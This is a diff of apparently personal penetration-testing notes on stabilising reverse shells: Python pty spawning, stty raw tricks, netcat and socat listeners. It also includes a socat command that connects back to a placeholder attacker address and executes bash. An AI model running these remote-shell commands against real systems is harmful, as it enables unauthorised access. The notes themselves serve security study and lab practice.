@@ -2,23 +2,23 @@
 
 https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
-Interative shell commands steps:
-* Using Python
-step-1:
+##Interative shell commands steps:
+###Using Python
+*step-1
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-step-2:
+*step-2:
 export TERM=xterm
-Setp-3:
+*step-3:
 we will background the shell using Ctrl + Z. Back in our own terminal we use 
 stty raw -echo; fg. 
 This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process. 
 
-* Using rlwrap
+###Using rlwrap
 First invoke a listner
 >> rlwrap nc -lvnp <port>
 This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise.
 
-* using socat
+###using socat
 Start a listener on the attacker machine
 >>socat TCP-L:<port> -
 
@@ -30,11 +30,7 @@ The "pipes" option is used to force powershell (or cmd.exe) to use Unix style st
 This is the equivalent command for a Linux Target:
 >>socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
 
-
-
-
 https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys
-
 
 "Priv Esc Checklist"
 
